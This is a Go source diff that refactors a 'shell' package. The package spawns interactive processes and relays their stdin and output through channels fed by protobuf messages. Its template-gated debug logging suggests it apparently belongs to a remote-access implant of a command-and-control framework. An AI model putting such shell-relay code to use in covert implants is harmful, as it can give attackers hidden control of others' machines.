@@ -2,6 +2,7 @@ package shell
 
 import (
 	"io"
+	"log"
 	"os"
 	"os/exec"
 	"sync"
@@ -25,10 +26,10 @@ var (
 
 // Shell - Holds channels for a single shell
 type Shell struct {
-	ID   uint32
-	Path string
-	Send chan []byte
-	Recv chan []byte
+	ID    uint32
+	Path  string
+	Read  *chan []byte
+	Write *chan []byte
 }
 
 // Shells - Holds channels for all shells
@@ -49,7 +50,7 @@ func (s *shells) CloseShell(ID uint32) {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
 	if shell, ok := (*s.shells)[ID]; ok {
-		close(shell.Recv)
+		close(*shell.Read)
 		delete((*s.shells), ID)
 	}
 }
@@ -59,7 +60,7 @@ func (s *shells) WriteData(shellData *pb.ShellData) {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
 	if shell, ok := (*s.shells)[shellData.ID]; ok {
-		shell.Recv <- shellData.Stdin
+		(*shell.Write) <- shellData.Stdin
 	}
 }
 
@@ -77,7 +78,12 @@ func Start(command string) error {
 }
 
 // StartInteractive - Start a shell
-func StartInteractive(command string, send chan []byte, recv chan []byte) *Shell {
+func StartInteractive(command string) *Shell {
+
+	// {{if .Debug}}
+	log.Printf("[shell] %s", command)
+	// {{end}}
+
 	var cmd *exec.Cmd
 	cmd = exec.Command(command)
 
@@ -85,13 +91,23 @@ func StartInteractive(command string, send chan []byte, recv chan []byte) *Shell
 	stdout, _ := cmd.StdoutPipe()
 	stderr, _ := cmd.StderrPipe()
 
+	read := make(chan []byte)
+	write := make(chan []byte)
+
 	go func() {
 		buf := make([]byte, readBufSize)
 		for {
 			n, err := stderr.Read(buf)
-			if err != io.EOF {
-				send <- buf[:n]
+			// {{if .Debug}}
+			log.Printf("[shell] read (stderr)")
+			// {{end}}
+			if err == io.EOF {
+				// {{if .Debug}}
+				log.Printf("[shell] EOF (stderr)")
+				// {{end}}
+				return
 			}
+			read <- buf[:n]
 		}
 	}()
 
@@ -99,9 +115,17 @@ func StartInteractive(command string, send chan []byte, recv chan []byte) *Shell
 		buf := make([]byte, readBufSize)
 		for {
 			n, err := stdout.Read(buf)
-			if err != io.EOF {
-				send <- buf[:n]
+			// {{if .Debug}}
+			log.Printf("[shell] read (stdout)")
+			// {{end}}
+			if err == io.EOF {
+				// {{if .Debug}}
+				log.Printf("[shell] EOF (stdout)")
+				// {{end}}
+				return
 			}
+			read <- buf[:n]
+
 		}
 	}()
 	go func() {
@@ -109,19 +133,22 @@ func StartInteractive(command string, send chan []byte, recv chan []byte) *Shell
 			stdin.Close()
 			stdout.Close()
 			stderr.Close()
-			close(send)
+			close(read)
 		}()
-		for incoming := range recv {
+		for incoming := range write {
+			// {{if .Debug}}
+			log.Printf("[shell] write (stdin)")
+			// {{end}}
 			stdin.Write(incoming)
 		}
 	}()
-	cmd.Run()
+	cmd.Start()
 
 	return &Shell{
-		ID:   GetShellID(),
-		Path: command,
-		Send: send,
-		Recv: recv,
+		ID:    GetShellID(),
+		Path:  command,
+		Read:  &read,
+		Write: &write,
 	}
 }
 
